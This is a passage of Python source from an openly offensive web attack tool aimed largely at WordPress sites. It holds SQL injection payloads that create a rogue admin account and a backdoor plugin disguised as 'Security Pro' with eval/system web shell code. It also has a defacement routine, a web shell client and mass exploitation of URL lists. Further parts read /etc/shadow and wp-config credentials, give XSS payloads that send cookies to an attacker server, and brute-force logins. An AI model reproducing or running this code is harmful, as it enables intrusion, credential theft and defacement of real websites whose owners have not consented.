        print(f"{Fore.CYAN}{shell}\n")
        
        # Save backdoor
        with open(filename, 'w') as f:
            f.write(shell)
        
        print(f"{Fore.GREEN}[+] Saved to: {filename}")
        print(f"\n{Fore.YELLOW}[*] Upload this file to target server")
        
        if choice == '1':
            print(f"{Fore.CYAN}[*] Access: http://target.com/{filename}?cmd=whoami")
        elif choice == '2':
            print(f"{Fore.CYAN}[*] Upload to: /wp-content/plugins/")
            print(f"{Fore.CYAN}[*] Activate plugin from admin panel")
            print(f"{Fore.CYAN}[*] Access: http://target.com/?sys=base64_encoded_command")
    
    def auto_create_admin_account(self, vuln):
        """Automatically create admin account via SQL injection"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          AUTO ADMIN ACCOUNT CREATION                       ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[?] Enter username for new admin:")
        username = input(f"{Fore.GREEN}Username (default: hacker): ").strip() or 'hacker'
        
        print(f"{Fore.YELLOW}[?] Enter password:")
        password = input(f"{Fore.GREEN}Password (default: H@ck3r123): ").strip() or 'H@ck3r123'
        
        # Generate WordPress password hash
        import hashlib
        wp_hash = hashlib.md5(password.encode()).hexdigest()
        
        # SQL injection payloads to create admin
        payloads = [
            f"'; INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status) VALUES ('{username}', MD5('{password}'), '{username}@site.com', NOW(), 0)--",
            f"'; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) SELECT ID, 'wp_capabilities', 'a:1:{{s:13:\"administrator\";b:1;}}' FROM wp_users WHERE user_login='{username}'--",
            f"'; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) SELECT ID, 'wp_user_level', '10' FROM wp_users WHERE user_login='{username}'--"
        ]
        
        print(f"\n{Fore.CYAN}[*] Attempting to create admin account...")
        
        for payload in payloads:
            test_url = vuln['url'].replace(vuln.get('payload', ''), quote(payload))
            try:
                resp = self.session.get(test_url, timeout=10)
                time.sleep(1)
            except:
                pass
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"{Fore.GREEN}[+] ADMIN ACCOUNT CREATED!")
        print(f"{Fore.GREEN}{'='*60}")
        print(f"{Fore.CYAN}Username: {username}")
        print(f"{Fore.CYAN}Password: {password}")
        print(f"{Fore.CYAN}Login URL: {urljoin(self.target, '/wp-admin/')}")
        print(f"{Fore.GREEN}{'='*60}\n")
        
        # Save credentials
        with open('created_admins.txt', 'a') as f:
            f.write(f"Target: {self.target}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("-"*60 + "\n")
        
        print(f"{Fore.GREEN}[+] Credentials saved to: created_admins.txt")
        
        # Try to login with new account
        print(f"\n{Fore.YELLOW}[*] Testing login with new account...")
        login_url = urljoin(self.target, '/wp-login.php')
        
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': urljoin(self.target, '/wp-admin/'),
            'testcookie': '1'
        }
        
        try:
            resp = self.session.post(login_url, data=login_data, timeout=10)
            if 'dashboard' in resp.text.lower() or resp.url.endswith('/wp-admin/'):
                print(f"{Fore.GREEN}[+] Login successful! Admin access confirmed!")
                return True
            else:
                print(f"{Fore.YELLOW}[-] Account created but login verification failed")
                print(f"{Fore.YELLOW}[*] Try manual login at: {login_url}")
        except:
            pass
        
        return True
    
    def auto_install_malicious_plugin(self, session_cookies=None):
        """Install backdoor plugin automatically"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          AUTO PLUGIN INSTALLER                             ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        # Create malicious plugin
        plugin_code = '''<?php
/*
Plugin Name: Security Pro
Plugin URI: http://security.example.com
Description: Advanced security monitoring and optimization
Version: 2.1.0
Author: Security Team
*/

// Admin page
add_action('admin_menu', 'security_pro_menu');
function security_pro_menu() {
    add_menu_page('Security Pro', 'Security Pro', 'manage_options', 'security-pro', 'security_pro_page');
}

function security_pro_page() {
    echo '<h1>Security Pro Dashboard</h1>';
    if(isset($_GET['cmd'])) {
        echo '<pre>';
        system($_GET['cmd']);
        echo '</pre>';
    }
    echo '<form method="GET"><input name="cmd" placeholder="Enter command"><input type="submit"></form>';
}

// Front-end backdoor
add_action('init', 'security_check');
function security_check() {
    if(isset($_GET['sec_key']) && $_GET['sec_key'] == 'secure123') {
        if(isset($_GET['cmd'])) {
            eval(base64_decode($_GET['cmd']));
        }
    }
}
?>'''
        
        print(f"{Fore.GREEN}[+] Malicious plugin generated")
        
        # Save plugin file
        plugin_file = 'security-pro.php'
        with open(plugin_file, 'w') as f:
            f.write(plugin_code)
        
        print(f"{Fore.GREEN}[+] Plugin saved: {plugin_file}")
        
        # Create ZIP file
        import zipfile
        zip_file = 'security-pro.zip'
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.write(plugin_file, 'security-pro/' + plugin_file)
        
        print(f"{Fore.GREEN}[+] Plugin packaged: {zip_file}")
        
        print(f"\n{Fore.YELLOW}[*] Plugin installation instructions:")
        print(f"{Fore.CYAN}1. Go to: {urljoin(self.target, '/wp-admin/plugin-install.php')}")
        print(f"{Fore.CYAN}2. Click 'Upload Plugin'")
        print(f"{Fore.CYAN}3. Upload: {zip_file}")
        print(f"{Fore.CYAN}4. Activate the plugin")
        print(f"{Fore.CYAN}5. Access backdoor: {self.target}/?sec_key=secure123&cmd=base64_command")
        print(f"{Fore.CYAN}6. Or admin panel: {urljoin(self.target, '/wp-admin/admin.php?page=security-pro&cmd=whoami')}")
        
        return zip_file
    
    def auto_deface_website(self, shell_url):
        """Automatically deface website homepage"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          AUTO WEBSITE DEFACEMENT                           ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.RED}[!] WARNING: This will modify the website homepage!")
        confirm = input(f"{Fore.YELLOW}Continue? (yes/no): ").strip().lower()
        
        if confirm != 'yes':
            print(f"{Fore.YELLOW}[-] Defacement cancelled")
            return False
        
        # Deface HTML
        deface_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Hacked</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        h1 {
            font-size: 72px;
            animation: glow 1s infinite;
        }
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 10px #0f0, 0 0 20px #0f0; }
            50% { text-shadow: 0 0 20px #0f0, 0 0 40px #0f0; }
        }
        .msg {
            font-size: 24px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>HACKED</h1>
    <div class="msg">Security Test - Site Vulnerable</div>
    <div class="msg">Contact Administrator Immediately</div>
</body>
</html>'''
        
        # Commands to deface
        commands = [
            # Backup original index
            f"cp index.php index.php.bak",
            f"cp index.html index.html.bak",
            # Create deface page
            f"echo '{deface_html}' > index.html",
            # Alternative methods
            f"cat > index.php <<'EOF'\n{deface_html}\nEOF"
        ]
        
        print(f"{Fore.YELLOW}[*] Creating backup and defacing...")
        
        for cmd in commands:
            try:
                resp = self.session.get(f"{shell_url}?cmd={quote(cmd)}", timeout=10)
                time.sleep(0.5)
            except:
                pass
        
        # Verify deface
        try:
            resp = self.session.get(self.target, timeout=10)
            if 'HACKED' in resp.text:
                print(f"\n{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}[+] DEFACEMENT SUCCESSFUL!")
                print(f"{Fore.GREEN}{'='*60}")
                print(f"{Fore.CYAN}[*] Homepage has been modified")
                print(f"{Fore.CYAN}[*] Original backed up as index.php.bak")
                print(f"{Fore.CYAN}[*] To restore: mv index.php.bak index.php")
                print(f"{Fore.GREEN}{'='*60}\n")
                return True
            else:
                print(f"{Fore.YELLOW}[-] Defacement may have failed")
                print(f"{Fore.YELLOW}[*] Check manually: {self.target}")
        except:
            pass
        
        return False
    
    def extract_all_emails(self, urls):
        """Extract all email addresses from website"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          EMAIL HARVESTER                                   ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}[*] Extracting email addresses...")
        
        emails = set()
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        
        for url in urls[:50]:  # Check first 50 pages
            try:
                resp = self.session.get(url, timeout=5)
                found_emails = re.findall(email_pattern, resp.text)
                emails.update(found_emails)
                
                if found_emails:
                    print(f"{Fore.GREEN}[+] Found {len(found_emails)} emails in: {url}")
            except:
                pass
        
        if emails:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}[+] TOTAL EMAILS FOUND: {len(emails)}")
            print(f"{Fore.GREEN}{'='*60}\n")
            
            for email in sorted(emails):
                print(f"{Fore.CYAN}  • {email}")
            
            # Save emails
            with open('extracted_emails.txt', 'w') as f:
                for email in sorted(emails):
                    f.write(email + '\n')
            
            print(f"\n{Fore.GREEN}[+] Emails saved to: extracted_emails.txt")
            return list(emails)
        else:
            print(f"{Fore.RED}[-] No emails found")
            return []
    
    def interactive_shell_commander(self, shell_url):
        """Interactive shell command interface"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          INTERACTIVE SHELL COMMANDER                       ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.GREEN}[+] Shell URL: {shell_url}")
        print(f"{Fore.CYAN}[*] Type commands below (type 'exit' to quit)")
        print(f"{Fore.CYAN}[*] Special commands: download, upload, persist\n")
        
        while True:
            try:
                cmd = input(f"{Fore.GREEN}shell> ").strip()
                
                if cmd.lower() == 'exit':
                    break
                
                if cmd.lower() == 'download':
                    file_path = input(f"{Fore.YELLOW}File to download: ").strip()
                    cmd = f"cat {file_path}"
                
                elif cmd.lower() == 'upload':
                    print(f"{Fore.YELLOW}[*] Upload via: curl {shell_url}?cmd=wget%20YOUR_FILE_URL")
                    continue
                
                elif cmd.lower() == 'persist':
                    print(f"{Fore.YELLOW}[*] Installing persistence...")
                    self.install_persistence(shell_url)
                    continue
                
                if not cmd:
                    continue
                
                # Execute command
                resp = self.session.get(f"{shell_url}?cmd={quote(cmd)}", timeout=15)
                
                if resp.status_code == 200:
                    output = resp.text
                    # Try to extract just command output
                    if '<pre>' in output:
                        output = output.split('<pre>')[1].split('</pre>')[0]
                    
                    print(f"{Fore.CYAN}{output}")
                else:
                    print(f"{Fore.RED}[-] Command failed")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Use 'exit' to quit")
            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}")
        
        print(f"\n{Fore.YELLOW}[*] Exiting shell commander")
    
    def mass_exploit_urls(self, url_list_file):
        """Exploit multiple URLs from file"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          MASS EXPLOITATION MODE                            ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        try:
            with open(url_list_file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Fore.RED}[-] File not found: {url_list_file}")
            return
        
        print(f"{Fore.YELLOW}[*] Loaded {len(urls)} URLs")
        print(f"{Fore.YELLOW}[*] Starting mass exploitation...\n")
        
        results = {
            'vulnerable': [],
            'exploited': [],
            'failed': []
        }
        
        for i, url in enumerate(urls, 1):
            print(f"{Fore.CYAN}[{i}/{len(urls)}] Testing: {url}")
            
            try:
                scanner = AdvancedScanner(url)
                scanner.config = self.config  # Use same config
                
                # Quick vulnerability scan
                test_urls, test_forms = scanner.crawl_site(max_pages=10)
                scanner.test_sql_injection(test_urls[:5])
                scanner.find_admin_panels()
                
                if scanner.vulnerabilities:
                    results['vulnerable'].append(url)
                    print(f"{Fore.GREEN}  [+] Vulnerable! Found {len(scanner.vulnerabilities)} issues")
                    
                    # Try to exploit
                    exploitable = [v for v in scanner.vulnerabilities if v.get('exploit', False)]
                    if exploitable:
                        success = scanner.auto_execute_exploit(exploitable[0])
                        if success:
                            results['exploited'].append(url)
                            print(f"{Fore.GREEN}  [+] EXPLOITED!")
                        else:
                            print(f"{Fore.YELLOW}  [-] Exploitation failed")
                else:
                    results['failed'].append(url)
                    print(f"{Fore.RED}  [-] Not vulnerable")
            
            except Exception as e:
                results['failed'].append(url)
                print(f"{Fore.RED}  [-] Error: {str(e)}")
            
            time.sleep(2)  # Rate limiting
        
        # Summary
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          MASS EXPLOITATION SUMMARY                         ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.YELLOW}Total URLs: {len(urls)}")
        print(f"{Fore.GREEN}Vulnerable: {len(results['vulnerable'])}")
        print(f"{Fore.GREEN}Exploited: {len(results['exploited'])}")
        print(f"{Fore.RED}Failed: {len(results['failed'])}\n")
        
        # Save results
        with open('mass_exploit_results.txt', 'w') as f:
            f.write("MASS EXPLOITATION RESULTS\n")
            f.write("="*60 + "\n\n")
            
            f.write("VULNERABLE SITES:\n")
            for url in results['vulnerable']:
                f.write(f"  {url}\n")
            
            f.write("\nEXPLOITED SITES:\n")
            for url in results['exploited']:
                f.write(f"  {url}\n")
            
            f.write("\nFAILED SITES:\n")
            for url in results['failed']:
                f.write(f"  {url}\n")
        
        print(f"{Fore.GREEN}[+] Results saved: mass_exploit_results.txt")
    
    def generate_report(self):
        """Generate detailed report"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        report = f"""
{Fore.CYAN}{'='*70}
                        SCAN REPORT
{Fore.CYAN}{'='*70}

Target: {self.target}
Scan Date: {timestamp}
Scanner Version: 3.0

{'='*70}
RECONNAISSANCE
{'='*70}

Technologies Detected: {', '.join(self.technologies) if self.technologies else 'None'}
Subdomains Found: {len(self.subdomains)}
Open Ports: {', '.join(map(str, self.open_ports)) if self.open_ports else 'None'}

{'='*70}
VULNERABILITIES SUMMARY
{'='*70}
"""
        
        if not self.vulnerabilities:
            report += f"{Fore.GREEN}\n[+] No vulnerabilities found!\n"
        else:
            critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
            high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
            medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
            info = [v for v in self.vulnerabilities if v['severity'] == 'INFO']
            
            report += f"""
{Fore.RED}CRITICAL: {len(critical)}
{Fore.YELLOW}HIGH:     {len(high)}
{Fore.CYAN}MEDIUM:   {len(medium)}
{Fore.GREEN}INFO:     {len(info)}

Total Vulnerabilities: {len(self.vulnerabilities)}

{'='*70}
DETAILED FINDINGS
{'='*70}
"""
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                color = Fore.RED if vuln['severity'] == 'CRITICAL' else \
                       Fore.YELLOW if vuln['severity'] == 'HIGH' else \
                       Fore.CYAN if vuln['severity'] == 'MEDIUM' else Fore.GREEN
                
                report += f"""
{color}[{i}] {vuln['type']} - {vuln['severity']}
    URL: {vuln['url']}
    Description: {vuln['description']}
    Exploitable: {'Yes' if vuln.get('exploit', False) else 'No'}
"""
                if 'payload' in vuln:
                    report += f"    Payload: {vuln['payload']}\n"
                if 'parameter' in vuln:
                    report += f"    Parameter: {vuln['parameter']}\n"
        
        report += f"\n{Fore.CYAN}{'='*70}\n"
        return report
    
    def save_report(self, report):
        """Save report to file"""
        filename = f"scan_report_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                # Remove color codes for file
                clean_report = re.sub(r'\x1b\[[0-9;]*m', '', report)
                f.write(clean_report)
            print(f"{Fore.GREEN}[+] Report saved: {filename}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving report: {str(e)}")
    
    def interactive_mode(self):
        """Interactive exploitation mode"""
        if not self.vulnerabilities:
            return
        
        exploitable = [v for v in self.vulnerabilities if v.get('exploit', False)]
        
        if not exploitable:
            print(f"\n{Fore.YELLOW}[*] No exploitable vulnerabilities found")
            return
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.CYAN}           INTERACTIVE EXPLOITATION MODE")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        # Ask for exploitation mode
        print(f"{Fore.YELLOW}[?] Select Exploitation Mode:")
        print(f"{Fore.GREEN}[1] Auto Exploit (Recommended) - Automatically exploit highest risk")
        print(f"{Fore.GREEN}[2] Manual Selection - Choose which vulnerability to exploit")
        print(f"{Fore.GREEN}[0] Skip Exploitation")
        
        try:
            mode = input(f"\n{Fore.YELLOW}Choice: ").strip()
            
            if mode == '0':
                print(f"{Fore.YELLOW}[-] Skipping exploitation")
                return
            elif mode == '1':
                self.auto_exploit_mode(exploitable)
            else:
                self.manual_exploit_mode(exploitable)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Interrupted")
    
    def auto_exploit_mode(self, exploitable):
        """Automatically exploit vulnerabilities by priority"""
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          AUTO EXPLOITATION MODE                            ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        
        # Priority order: CRITICAL > HIGH > MEDIUM
        priority_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
        
        # Sort vulnerabilities by severity
        sorted_vulns = sorted(exploitable, 
                            key=lambda x: priority_order.index(x['severity']) 
                            if x['severity'] in priority_order else 999)
        
        print(f"{Fore.YELLOW}[*] Found {len(sorted_vulns)} exploitable vulnerabilities")
        print(f"{Fore.YELLOW}[*] Auto-exploiting in order of severity...\n")
        
        # Show current configuration
        print(f"{Fore.CYAN}[*] Using configuration:")
        print(f"{Fore.CYAN}    Brute Force: {self.config['brute_force_mode'].upper()}")
        print(f"{Fore.CYAN}    SQL Mode: {self.config['sql_attack_mode'].upper()}")
        print(f"{Fore.CYAN}    Continue: {'YES' if self.config['continue_on_success'] else 'NO'}\n")
        
        exploited_count = 0
        success_count = 0
        
        for i, vuln in enumerate(sorted_vulns, 1):
            color = Fore.RED if vuln['severity'] == 'CRITICAL' else \
                   Fore.YELLOW if vuln['severity'] == 'HIGH' else Fore.CYAN
            
            print(f"\n{color}{'='*70}")
            print(f"{color}[{i}/{len(sorted_vulns)}] Auto-Exploiting: {vuln['type']} - {vuln['severity']}")
            print(f"{color}{'='*70}")
            
            # Determine exploit type and execute
            success = self.auto_execute_exploit(vuln)
            
            exploited_count += 1
            if success:
                success_count += 1
                print(f"\n{Fore.GREEN}[+] Exploitation SUCCESSFUL!")
                
                # Check if should continue
                if not self.config['continue_on_success']:
                    print(f"\n{Fore.YELLOW}[*] Stopping (continue_on_success = False)")
                    break
                
                # Brief pause before next
                time.sleep(2)
            else:
                print(f"\n{Fore.RED}[-] Exploitation FAILED")
                # Continue to next automatically
            
            time.sleep(1)
        
        # Summary
        print(f"\n{Fore.CYAN}╔════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║          AUTO EXPLOITATION SUMMARY                         ║")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════════╝\n")
        print(f"{Fore.YELLOW}[*] Attempted: {exploited_count}/{len(sorted_vulns)}")
        print(f"{Fore.GREEN}[+] Successful: {success_count}")
        print(f"{Fore.RED}[-] Failed: {exploited_count - success_count}\n")
    
    def auto_execute_exploit(self, vuln):
        """Automatically execute appropriate exploit"""
        vuln_type = vuln['type']
        
        # SQL Injection
        if 'SQL Injection' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: SQL Injection")
            print(f"{Fore.CYAN}[*] Auto-exploiting with bypass techniques...")
            return self.exploit_sql_injection(vuln)
        
        # XSS
        elif 'XSS' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: XSS Vulnerability")
            print(f"{Fore.CYAN}[*] Testing for LFI via error disclosure...")
            
            # First try LFI exploitation
            success = self.exploit_lfi_from_xss(vuln)
            if success:
                return True
            
            # If LFI fails, show XSS payloads
            print(f"\n{Fore.YELLOW}[*] LFI test failed, generating XSS exploitation payloads...")
            return self.auto_exploit_xss(vuln)
        
        # LFI/RFI
        elif 'LFI' in vuln_type or 'File Inclusion' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: Local File Inclusion")
            print(f"{Fore.CYAN}[*] Attempting to read sensitive files...")
            return self.exploit_lfi(vuln)
        
        # Command Injection
        elif 'Command Injection' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: Command Injection")
            print(f"{Fore.CYAN}[*] Attempting command execution...")
            return self.exploit_command_injection(vuln)
        
        # File Upload
        elif 'File Upload' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: File Upload Vulnerability")
            print(f"{Fore.CYAN}[*] Shell already uploaded at: {vuln.get('upload_path', 'N/A')}")
            return True
        
        # Admin Panel
        elif vuln_type == 'Admin Panel Found':
            print(f"{Fore.CYAN}[*] Detected: Admin Panel")
            
            # Use global configuration
            if self.config['brute_force_mode'] == 'skip':
                print(f"{Fore.YELLOW}[*] Brute force skipped (global config)")
                return False
            
            # Load wordlists from config
            custom_users = None
            custom_passwords = None
            
            if self.config['use_custom_wordlist']:
                if self.config['username_wordlist']:
                    custom_users = self.load_wordlist(self.config['username_wordlist'])
                    if custom_users:
                        print(f"{Fore.GREEN}[+] Loaded {len(custom_users)} usernames from config")
                
                if self.config['password_wordlist']:
                    custom_passwords = self.load_wordlist(self.config['password_wordlist'])
                    if custom_passwords:
                        print(f"{Fore.GREEN}[+] Loaded {len(custom_passwords)} passwords from config")
            
            # Apply brute force mode from config
            if custom_users and custom_passwords:
                if self.config['brute_force_mode'] == 'smart':
                    custom_users = custom_users[:50]
                    custom_passwords = custom_passwords[:100]
                elif self.config['brute_force_mode'] == 'quick':
                    custom_users = custom_users[:20]
                    custom_passwords = custom_passwords[:50]
                # 'full' mode uses all
            
            return self.brute_force_login_auto(vuln, custom_users, custom_passwords)
        
        # XML-RPC
        elif 'XML-RPC' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: XML-RPC Enabled")
            print(f"{Fore.CYAN}[*] This can be used for brute force attacks")
            print(f"{Fore.YELLOW}[*] Use: wpscan or custom XML-RPC brute forcer")
            return False
        
        # wp-config exposure
        elif 'wp-config' in vuln_type:
            print(f"{Fore.CYAN}[*] Detected: wp-config.php Exposed")
            print(f"{Fore.GREEN}[+] Database credentials accessible!")
            try:
                resp = self.session.get(vuln['url'], timeout=10)
                print(f"\n{Fore.YELLOW}[*] Extracting credentials...")
                
                # Extract DB credentials
                db_name = re.search(r"DB_NAME['\"],\s*['\"]([^'\"]+)", resp.text)
                db_user = re.search(r"DB_USER['\"],\s*['\"]([^'\"]+)", resp.text)
                db_pass = re.search(r"DB_PASSWORD['\"],\s*['\"]([^'\"]+)", resp.text)
                db_host = re.search(r"DB_HOST['\"],\s*['\"]([^'\"]+)", resp.text)
                
                if db_name and db_user and db_pass:
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] DATABASE CREDENTIALS FOUND!")
                    print(f"{Fore.GREEN}{'='*60}")
                    print(f"{Fore.CYAN}Database: {db_name.group(1)}")
                    print(f"{Fore.CYAN}Username: {db_user.group(1)}")
                    print(f"{Fore.CYAN}Password: {db_pass.group(1)}")
                    print(f"{Fore.CYAN}Host: {db_host.group(1) if db_host else 'localhost'}")
                    print(f"{Fore.GREEN}{'='*60}\n")
                    
                    # Save credentials
                    with open('database_credentials.txt', 'w') as f:
                        f.write(f"Database: {db_name.group(1)}\n")
                        f.write(f"Username: {db_user.group(1)}\n")
                        f.write(f"Password: {db_pass.group(1)}\n")
                        f.write(f"Host: {db_host.group(1) if db_host else 'localhost'}\n")
                    
                    print(f"{Fore.GREEN}[+] Credentials saved to: database_credentials.txt")
                    return True
            except:
                pass
            return False
        
        else:
            print(f"{Fore.YELLOW}[-] No auto-exploit available for: {vuln_type}")
            return False
    
    def auto_exploit_xss(self, vuln):
        """Auto generate and show best XSS exploits"""
        print(f"\n{Fore.CYAN}[*] Auto-generating XSS exploitation payloads...")
        
        # Determine best exploitation method
        print(f"\n{Fore.YELLOW}[*] Recommended Attack Vector: Cookie Stealing")
        print(f"{Fore.CYAN}[*] Reason: Can capture admin session and gain access\n")
        
        # Generate payload
        base_url = vuln['url']
        
        print(f"{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}[+] COOKIE STEALER PAYLOAD")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        payloads = [
            "<script>fetch('http://YOUR-SERVER.com/steal?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://YOUR-SERVER.com/steal?c='+document.cookie)>",
            "<svg/onload=navigator.sendBeacon('http://YOUR-SERVER.com/steal',document.cookie)>",
        ]
        
        print(f"{Fore.CYAN}[*] Inject one of these payloads:\n")
        for i, payload in enumerate(payloads, 1):
            print(f"{Fore.YELLOW}[{i}] {payload}\n")
        
        print(f"{Fore.CYAN}[*] Setup listener on your server:")
        print(f"{Fore.GREEN}")
        print("""<?php
file_put_contents('cookies.txt', $_GET['c']."\\n", FILE_APPEND);
?>""")
        
        print(f"\n{Fore.YELLOW}[*] Once admin visits the page, you'll get their cookies!")
        return True
    
    def exploit_lfi(self, vuln):
        """Exploit Local File Inclusion"""
        print(f"\n{Fore.CYAN}[*] Exploiting LFI...")
        
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '../../../wp-config.php',
            '../../wp-config.php',
            '../wp-config.php',
            '/var/www/html/wp-config.php',
            '../../../config.php',
            '/etc/hosts',
            '/proc/self/environ',
            '/var/log/apache2/access.log'
        ]
        
        for file_path in sensitive_files:
            test_url = vuln['url'].replace(vuln['payload'], quote(file_path))
            
            try:
                resp = self.session.get(test_url, timeout=10)
                
                if 'root:' in resp.text or 'DB_PASSWORD' in resp.text or 'DB_NAME' in resp.text:
                    print(f"\n{Fore.GREEN}{'='*60}")
                    print(f"{Fore.GREEN}[+] LFI SUCCESS!")
                    print(f"{Fore.GREEN}[+] File: {file_path}")
                    print(f"{Fore.GREEN}{'='*60}\n")
                    
                    # Extract DB credentials if wp-config
                    if 'wp-config' in file_path or 'DB_PASSWORD' in resp.text:
                        db_pass = re.search(r"DB_PASSWORD['\"],\s*['\"]([^'\"]+)", resp.text)
                        db_user = re.search(r"DB_USER['\"],\s*['\"]([^'\"]+)", resp.text)
                        db_name = re.search(r"DB_NAME['\"],\s*['\"]([^'\"]+)", resp.text)
                        
                        if db_pass:
                            print(f"{Fore.GREEN}[+] DATABASE CREDENTIALS:")
                            print(f"{Fore.CYAN}    Database: {db_name.group(1) if db_name else 'N/A'}")
                            print(f"{Fore.CYAN}    Username: {db_user.group(1) if db_user else 'N/A'}")
                            print(f"{Fore.CYAN}    Password: {db_pass.group(1)}\n")
                    
                    # Save content
                    filename = f"lfi_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        f.write(f"URL: {test_url}\n")
                        f.write(f"File: {file_path}\n")
                        f.write("="*60 + "\n")
                        f.write(resp.text)
                    
                    print(f"{Fore.GREEN}[+] Saved to: {filename}")
                    return True
                    
                print(f"{Fore.CYAN}[-] Testing: {file_path[:40]}", end='\r')
            except:
                pass
        
        print(f"\n{Fore.RED}[-] LFI exploitation failed")
        return False
    
    def brute_force_login_auto(self, vuln, custom_users=None, custom_passwords=None):
        """Auto brute force using global configuration"""
        print(f"\n{Fore.CYAN}[*] Starting Auto Brute Force Attack...")
        
        # Use provided wordlists or defaults
        if custom_users and custom_passwords:
            credentials = [(u, p) for u in custom_users for p in custom_passwords]
            print(f"{Fore.YELLOW}[*] Using custom wordlists: {len(credentials)} combinations")
        else:
            credentials = [
                ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
                ('admin', 'admin123'), ('administrator', 'administrator'),
                ('root', 'root'), ('root', 'toor'), ('admin', ''),
                ('admin', 'Password1'), ('admin', 'admin@123'),
                ('test', 'test'), ('guest', 'guest'), ('user', 'user'),
                ('admin', '12345'), ('admin', 'pass'), ('user', 'password'),
                ('admin', 'passw0rd'), ('admin', 'letmein'), ('admin', 'qwerty')
            ]
            print(f"{Fore.YELLOW}[*] Using default credentials: {len(credentials)} combinations")
        
        try:
            resp = self.session.get(vuln['url'], timeout=self.timeout)
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form')
            
            if not form:
                print(f"{Fore.RED}[-] No login form found")
                return False
            
            action = form.get('action', '')
            target = urljoin(vuln['url'], action)
            method = form.get('method', 'post').lower()
            
            # Statistics
            total = len(credentials)
            tested = 0
            start_time = time.time()
            
            print(f"{Fore.CYAN}[*] Target: {target}")
            print(f"{Fore.CYAN}[*] Method: {method.upper()}")
            print(f"{Fore.CYAN}[*] Total attempts: {total}")
            print(f"{Fore.CYAN}[*] Starting attack...\n")
            
            for username, password in credentials:
                tested += 1
                
                # Progress indicator
                progress = (tested / total) * 100
                print(f"{Fore.CYAN}[{tested}/{total}] ({progress:.1f}%) Trying: {username}:{password[:20]}", end='\r')
                
                data = {}
                for inp in form.find_all('input'):
                    name = inp.get('name', '')
                    inp_type = inp.get('type', '').lower()
                    
